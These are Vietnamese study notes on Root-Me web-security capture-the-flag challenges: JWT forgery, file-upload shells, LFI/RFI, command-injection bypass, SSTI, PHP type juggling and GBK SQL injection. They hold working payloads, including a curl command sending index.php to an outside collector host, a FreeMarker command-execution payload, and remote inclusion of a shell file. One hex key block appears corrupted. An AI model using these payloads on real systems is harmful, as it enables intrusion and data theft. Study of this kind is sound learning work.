@@ -1,0 +1,255 @@
+﻿**CRLF 
+ascii
+- CR là chuyển dòng, xuống dòng 0x0D (char code = %0D)
+- LF là tạo ra dòng mới 0x0A (char code = %0A)
+- có thể chèn ký tự vào url để khai thác %0D%0A
+
+**file upload
+- VD khi upload ảnh, ta có thể truyền mã độc lên bằng cách giả dạng file ảnh thêm đuôi png,jpg...
+- nếu bị kiểm tra content-type:
+    +truyền file shell thêm đuôi png,jpg... ảnh lên rồi dùng burpsuite bắt xong lại xóa đuôi đi thì content-type vẫn là image/png,jpeg... nhưng file up lên lại là shell
+    + truyền file shell.php lên nhưng sửa content-type thành image/png..
+- nếu trang web yêu cầu bắt buộc phải sử dụng extension vd: .jpg, .png .....
+    + sử dụng byte null : shell.php%00.png thì nó chỉ đọc tới php thôi sau %00 sẽ coi như bị null
+
+**Json web token(JWT)
+- cấu trúc : header.payload.signature
+      + header : header sẽ chứa kiểu dữ liệu "typ", và thuật toán sử dụng để mã hóa ra chuỗi JWT "alg" (HMAC SHA256 - HS256 hoặc RSA).
+      + payload: sẽ chứa các thông tin mình muốn đặt trong chuỗi  Token như username , userId , author..
+      + signature:Phần chử ký này sẽ được tạo ra bằng cách mã hóa phần header , payload kèm theo một chuỗi secret (khóa bí mật) , ví dụ:
+		data = base64urlEncode( header ) + "." + base64urlEncode( payload )
+		signature = Hash( data, secret );
+- mục đích:Authentication, trao đổi thông tin
+
+CVE-2018-1000531
+
+**Backup file
+- file backup thông thường sẽ là .bak(vd index.php.bak) hoặc có dấu ~(index.php~)
+- công cụ dò file backup(Nmap): có script trên gg
+   + câu lệnh: nmap -p 80 --script=.
+
+**Improper redirect 
+- trong response của http header có location
+	location: + vị trí url bạn đang đứng
+		  + sd để yêu cầu trình duyệt điều hướng tới url
+
+**Insecure Code Management
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJyb2xlIjoiYWRtaW4ifQ==.
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImV4cCI6MTYxMzcyNTkyNSwibmJmIjoxNjEzNzI1NzQ1LCJ0eXBlIjoiYWNjZXNzIiwiaWRlbnRpdHkiOiJhZG1pbiIsImp0aSI6ImZlYjAyYTFlLTk2NDYtNGFhZC1hZjAxLWI2ODBjZjczZGZmNyIsImlhdCI6MTYxMzcyNTc0NX0.vusaD0568ulhOi43hLEpm7g-IxZFFVMMXhdIA87mV1g
+
+
+**Directory traversal
+-- sử dụng công cụ để quét đường dẫn trên web,Tìm kiếm các đường dẫn web bị ẩn
+--brute force tên các thư mục qua đó liệt kê được các thư mục tồn tại trên hệ thống.
+  Phương pháp này còn được gọi là spider/crawler/fuzzing trong OWASP.
+-- công cụ Disbuster, Dirsearch
+
+**JSON Web Token (JWT) - Weak secret
+-- Mục đích bài này là lấy đc token rồi, làm sao để sửa nó
+nếu sửa payload thành admin thì phần chữ kỹ cũng thay đổi theo 
+do nó HS256(sử dụng khóa bí mật),-> brute force để lấy khóa bí mật, sau 
+đó mã hóa lại token khi đã bị sửa đổi bằng khóa bí mật đó
+link python brute force https://github.com/loveyuki147/Root-me_Web-Server/tree/main/%2321%20JSON%20Web%20Token%20(JWT)%20-%20Weak%20secret
+
+**JWT - Revoked token
+--sau khi đăng nhập thành công, server sẽ chả cho user 1 access-token(jwt): trong đó gồm
+  id,vai trò, role . jwt đc mã hóa khóa bí mật đc chia sẻ giữa 2 bên.
+  Sau đó mỗi yêu cầu mà user đưa ra sẽ gửi cùng jwt 
+  Server nhận đc jwt dùng khóa giải mã và xem xét có cho phép hay k
+
+**PHP assert() , local file inclusion (LFI):
+-- khi truyền tham số trên url, server lấy giá trị trên tham số xuống và thực hiện include
+Chức năng include có thể bị tin tặc lợi dụng để khai thác và tấn công lại website. Có hai hình thức tấn công liên quan đến chức năng này:
+  -Local File Inclusion
+  -Remote File Inclusion
+1.site: www.victim_site.com/abc.php?testfile=example
+2. Mã nguồn PHP chứa lỗ hổng:
+	$test = $_REQUEST[“testfile”];
+	Include($test.”.php”);
+ -> hacker có thể truyền trên tham số 1 site độc hại khác và include vào site nạn nhân
+VD:
+1.site: www.victim_site.com/abc.jsp?test=http://www.attackersite.com/stealingcookie.js
+2. Mã nguồn java <c:import url=”<%= request.getParameter(“test”)%>”>
+
+--PHPUNIT test: Kiểm thử ứng dụng
+  1.Unit testing: Kiểm thử ở mức đơn vị mã nguồn. Một đơn vị mã nguồn là thành phần nhỏ nhất trong mã nguồn mà chúng ta có thể kiểm tra. 
+   Như vậy, trong Unit testing chúng ta sẽ kiểm thử các lớp (class), phương thức (method)… Mục tiêu của unit testing là kiểm tra tính đúng đắn trong các xử lý của từng đơn vị mã nguồn.
+  2.PHPUnit là một gói thư viện mã nguồn mở sử dụng trong Unit testing với ngôn ngữ PHP
+  ./vendor/bin/phpunit Đây là file để thực thi PHPUnit.
+
+  3.cấu trúc project của chúng ta như sau:
+    phpunit-tut/
+    |-- composer.json
+    |-- composer.lock
+    |-- phpunit.xml
+    |-- src
+    |-- tests    //unit test sẽ đc viết vào đây
+    |-- vendor
+
+include/ww', 'r') == true or system('shell') and strpos('1
+assert("strpos('include/ww', 'r') == true or system('shell') and strpos('1', '..') === false") or die("Detected hacking attempt!");
+
+**PHP- filter bypass
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=login.php
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php
+http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=/etc/passwd
+
+**File upload - ZIP
+-- Nếu tải file shell.php lên thì bị lỗi nhưng vẫn upload đc, server sẽ đổi extension thành .zip, nhưng khi tải về thì sẽ k mở đc
+-- Nếu nén file shell.php->shell.zip rồi upload nên thì đc, sau đó ấn vào file giải nén thì gặp lỗi 403 do server cấm thực thi.
+-- Nếu nén file ảnh ->> file zip rồi upload lên thì mở đc
+--> Cách giải quyết:
+   - Thuật ngữ softlink = symbolic link = symlink là đường dẫn trỏ tới file nào đó	
+   - tạo 1 softlink trong kali:
+      ln -s ../../../index.php index.txt   ->(bây h index.txt tham chiếu, trỏ đến index.php), Tại sao lại là ../../../index.php ?Vì thư mục sau khi tải lên và giải nén khác với thư mục của index.php ba cấp.
+   - sau đó sử dụng lệnh zip để nén tệp liên kết tượng trưng:
+      zip --symlinks index.zip index.txt   ->(giờ thì index.txt đc nén vào index.zip)
+   - upload file zip lên và lấy flag
+
+-- Nén folder thành 1 file zip : # zip -r test.zip folder1
+   Sử dụng tùy chọn -r để zip nén toàn bộ folder và các file bên trong.
+-- có thể lưu trữ các liên kết tượng trưng dưới dạng các liên kết tượng trưng
+   Giả sử foo là một thư mục chứa các liên kết tượng trưng: #zip --symlinks -r foo.zip foo/
+
+**Command Injection - Fillter Bypass
+  - Bài này nó đã tạo một blacklist để filter user input tránh cho việc thực thi command trên server. 
+  Vậy nhiệm vụ là phải tìm cách bypass qua filter này, 
+  blind command như là : &, &&, |, ||, (), $(), ${},“ tất cả đều fail
+  - Dùng burpsuite intruder để tự động quét tất cả các payload trong list thì thấy %0A qua đc
+    , dùng %0A để tạo ra dòng mới và inject 
+    list : https://github.com/payloadbox/command-injection-payload-list
+  - Sau thì vẫn k đọc được file vì blind nó k show dữ liệu ra thế thì có 2 cách
+    + dùng BurpCollaboration Client, dùng lệnh curl download file về là đọc đc
+      ip=127.0.0.1%0127.0.0.1%0Acurl -X POST -F file=@index.php https://…burpcollaborator.net
+    + không thì dùng request bin để extract(trích xuất) data, dùng curl gửi file index ra ngoài
+       ip=127.0.0.1%0Acurl -X POST -F file=@index.php https://requestb.in/pxeesdpx?id=abc
+
+**Java - Server-side Template Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection#code-execution-2
+fuzz dùng instruder, dưới là 1 list payloads dùng inject cho mỗi template khác nhau.
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
+
+  template(có thể thay thế cho jsp,ví dụ thymeleft : <p th:text= "${message}">Default message </p>                )
+- lỗi này cho phép inject template trực tiếp
+- 3 bước để khai thác:
+   Detect -> identify -> exploit
+   + Detect: gửi các payload sử dụng các toán tử cơ bản để phát hiện nhiều template engine bằng 1 câu HTTP request duy nhất.Nhúng 1 câu lệnh, 1 payload để phát hiện lỗi xem server dùng template engine nào VD: ${3*3}, #{3*3} --> 9 , > có thể bên kia dùng freemarker
+   + Identify: Sau khi phát hiện template injection là xác định bên kia dùng template engine nào
+     VD:  test với input {{7 * '7'}} sẽ trả lại
+	      49 trong Twig
+	      7777777 trong Jinja2
+   + Exploit: Đọc tài liệu về template đó
+- trong java có 3 template phổ biến là : velocity,mako,freemarker
+
+-- Resolve bài này trên rootme :sau khi phát hiện template đc sử dụng là freemarker thì vào tra payload của nó đc
+   <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+    - tức là <#assign> cho phép tạo object tùy ý ex, nó là object của "Execute" Class đc implement từ "TemplateModel"
+    - sau đó chỗ id thì thay bằng câu lệnh ls , cat ...
+
+**JSON Web Token (JWT) - Public key
+-- Thay đổi thuật toán ký từ RS256 -> HS256,
+   RS256 sử dụng thuật toán bất đối xứng(công khai), lấy khóa bí mật (private key) để ký và bên kia dùng public key để giải mã
+   HS256 sử dụng thuật toán mh đối xứng(bí mật), lấy khóa bí mật để mã hóa và cũng khóa đó để giải mã
+ -> Nếu đổi thuật toán từ RS256 -> HS256 hệ thống sẽ lấy public key của RS256 làm khóa bí mật mã hóa và giải mã cho HS256
+ tài liệu : https://ddungkill.tistory.com/127
+            https://www.nccgroup.com/ae/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
+-- public key của RSA ở dạng pem, phải convert nó về ascii hex (do máy chủ sử dụng chứng chỉ TLS)
+   # openssl s_client -connect <hostname>:443
+
+https://baotdvi.wordpress.com/category/ctf/root-me/
+
+**Local file inclusion-- Double Encoding
+
+-- tài liệu: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
+
+- Kiểu tấn công này ngta mã hóa tham số đầu vào 2 lần ở dạng thập lục phân. 
+  Điều đó có thể xảy ra bởi vì máy chủ web chấp nhận và xử lý các yêu cầu của khách hàng ở nhiều dạng được mã hóa.
+-VD: mã hóa ký tự (../) ở dạng Double Encoding
+   mã hóa lần 1 ký tự (../) ở hệ thập lục phân là : %2E%2E%2f
+   mã hóa lần 2 ký tự % ở dạng mã thập lục phân là : %25
+   -> mã hóa ký tự ../ ở dạng DouEncoding là : %252E%252E%252F
+http://challenge01.root-me.org/web-serveur/ch45/index.php?page=home
+- wrapper có dạng <scheme>://<target>
+     + scheme là tên wrapper: php,http,https,ftp,file,zip,data...
+     + VD :http://google.com/ là 1 http stream wrapper thay vì file stream wrapper
+
+- Bài này sử dụng double encoding và php://filter -> payload: php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv
+
+**PHP - Loose Comparison
+- Khi so sánh 1 chuỗi vs 1 số, PHP sẽ cố gắng chuyển chuỗi thành 1 số sau đó thực hiện sự so sánh
+- 0e1234 trong php -> 0^1234 = 0
+   ▪ TRUE: "0000" == int(0)
+   ▪ TRUE: "0e12" == int(0)
+   ▪ TRUE: "1abc" == int(1)
+   ▪ TRUE: "0abc" == int(0)
+   ▪ TRUE: "abc" == int(0) 
+- Giải bài này:
+   source code: 
+        if($s.$r == $h) {
+            print "Well done! Here is your flag: ".$flag;
+        }
+-> với r là 1 số random, cần tìm đầu vào s và h sao cho $s.$r==$h
+  do sử dụng "==" là loose comparison nên có thể khai thác : 0e123456 == 0e654321
+  + suy ra s sẽ là 0e để nối chuỗi với r -> 0eXXXXXX (X là số)
+  + tìm đầu vào chuỗi h sao cho khi từ input->hash MD5 sẽ cho output bắt đầu bằng 0e và theo sau là 1 chuỗi số : 0eXXXXXX
+       tìm đc h = 240610708
+ --->> s = 0e   , h= 240610708
+
+**PHP-Type Juggling
+https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/
+
+- Bài này có 2 lỗi, 1 là loose-comparision ở username, 2 là hàm strcmp() ở password
+   + loose-comparision : so sánh == không an toàn, nếu ta nhập input là 0, php sẽ so sánh 0 == "string" sẽ return TRUE do bất kì chuỗi nào bắt đầu không bằng số PHP sẽ đổi chuỗi về 0 nên 0 == 0
+     vì việc xác thực thông qua json nên có thể đổi đc type của input vd: {"username":"0"}-->{"username":0}
+     nếu đầu vào là tham số của POST,GET,COOKIE.. thì input sẽ CHỈ đc gửi đi dưới dạng String dẫn đến việc so sánh 2 string vd:  "0" == "admin" -> FALSE
+   + Hàm strcmp($string1, $string2) có:
+	Returns 0 nếu 2 strings bằng nhau
+	Returns <0, nếu $string2 lớn hơn $string1
+	Returns >0, nếu $string1 lớn hơn $string2
+        Returns 0 nếu ta truyền vào một array thay vì một string, kể cả khi warning (‘WARNING strcmp() expects parameter 2 to be string, array given on line number …!’) xuất hiện.
+      --> nếu truyền vào 1 mảng hàm strcmp([""],"String") sẽ báo lỗi nhưng vẫn return 0
+- Payloads bài này:
+    {"data":{"login":0,"password":[""]}} 
+
+**PHP-Remote file inclusion
+http://challenge01.root-me.org/web-serveur/ch13/?lang=
+<?php
+  if ( isset($_GET["lang"]) ){
+     $language = $_GET["lang"];
+  }
+  include($language."_lang.php");
+
+php>
+- Nếu tham số biến lang là 1 đường dẫn URL 1 web nào đó, nó sẽ include trang web đấy vào
+- Bài này khi request param tới server nó sẽ thêm _lang.php vào , vấn đề làm sao để chặt đc đoạn này -> sử dụng suffix ?
+- viết 1 file shell.txt để đọc đc file index.php nhưng hàm system(),shell_exec(),exec() đều bị block vì lý do bảo mật
+   -> dùng file_get_contents hoặc fread(fopen("index.php","r"),filesize("index.php"));
+   -> push file lên github đổi thành raw rồi copy link URL thi đc payload:
+     challenge01.root-me.org/web-serveur/ch13/?lang=https://raw.githubusercontent.com/DuyToi140299/document/ecab91ce45409fb0ef70f802d664f407c3266ba5/p0nyShell.txt?
+ 
+https://thanhlocpanda.wordpress.com/hackthebox-rootme-solution/page/2/
+
+**SQL injection - Authentication - GBK
+
+- Hàm mysql-real-escape-string để thêm ký tự \ vào trc các ký tự đặc biệt \x00, \n, \r, \, ', " , \x1a. để thoát ký tự đặc biệt
+  $query = sprintf("SELECT * FROM users WHERE user='%s' AND password='%s'",
+            mysql_real_escape_string($user),
+            mysql_real_escape_string($password));
+- Dùng burp sửa param login -> login[]  thì thấy báo lỗi sử dụng addslash(); -> cần bypass form login
+- Bài này phía server sử dụng hàm addslash() tương tự hàm mysql_real_escape_string để thêm dấu \ vào trc các ký tự đầu vào như: ' , " , \ , NULL để tránh bị SQL injection 
+  vd: query: SELECT * FROM user WHERE username = ''
+  input: admin' or 1=1--  => query: SELECT * FROM user WHERE username = ' admin\' or 1=1-- '
+- payload bài này như sau : login: %bf'+or+1=1--+&password:lagicungdc (%bf <-> %af)
+   -> server sẽ thêm ký tự vào trc ký tự ('): %bf\' -> 0xbf5c27 (bf->0xbf,\-> 0x5c,'-> 0x27  ,mã hex)
+   Trong GBK , 0xbf27 không phải là một ký tự nhiều byte hợp lệ, nhưng 0xbf5c là hợp lệ. Hiểu là 
+   ký tự single-byte, 0xbf27 được 0xbf( ¿) tiếp theo là 0x27( '), và 0xbf5clà 0xbf( ¿) tiếp theo là 0x5c( \).
+   addslashes()sửa %bf'(0xbf27) trở thành 0xbf5c27, một ký tự nhiều byte hợp lệ theo sau là một dấu ngoặc kép nhưng
+   0xbf5c được hiểu là một ký tự duy nhất, không phải hai.
+- điền payload xong thì response trả về : 302-Moved Temporarily (redirect tạm thời)
+
+2d2d2d2d2dbe47494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b694739770b4151efaa4fca518a4d4949bc674bca51ea7a45775a3451427749674d4e7a767453b8744a0a3177723675436d6a695475717a4273f8652f494dfb7076674e61536d3254596f6b5647376c6f5677774ded46584e655aed774e4f34744d45485258610a6a564353572b7a54636f4d8c585a45492f3476526da5306b756b47435ab24169612b4172dc2b792b615a4a6d716d382f2b731c5e68594c314d0a6cfd70796d495039715671497949486c6652344c384e715d4547365965679f426a764969fc71eb597070a7465655646d2f7956ae57d1674f73576b636c777230574e57766c584767526a4b5670674b714278554e486a5a506a63776c724c31564168596c456f4b336a574a5528345a55626777770a5073544d530b7ae3696c6bf9305549366b7103536a636e504c6b2b3758ce77555071614d4e78536a35716f50444d5935502b61683155384ac67749da51ab0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
+
+echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b43415145417a45775a3451427749674d4e7a7674536238744a0a3177723675436d6a695475717a42734638652f494d66427076674e61536d3254596f6b5647376c6f5677774d656446584e655a4564774e4f34744d45485258610a6a564353572b7a54636f4d3863585a45492f3476526d6135306b756b47435a42324169612b417264432b792b615a4a6d716d382f2b733143356568594c33314d0a6c666470796d495039715671497949486c6652344c384e7135444547365965673966426a76496946437165425970704137465655646d2f79566145574431674f0a73576b36336c777230574e57763643584767526a4b5670674b714278554e486a5a506a63776c724c31564168596c456f4b336a574a55323833345a55626777770a353073544d5330427a653336396c6b4639305549366b713033536a636e504c6b2b3758634577555071614d4e78536a35716f50444d5935502b61683155384a430a36774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d0a
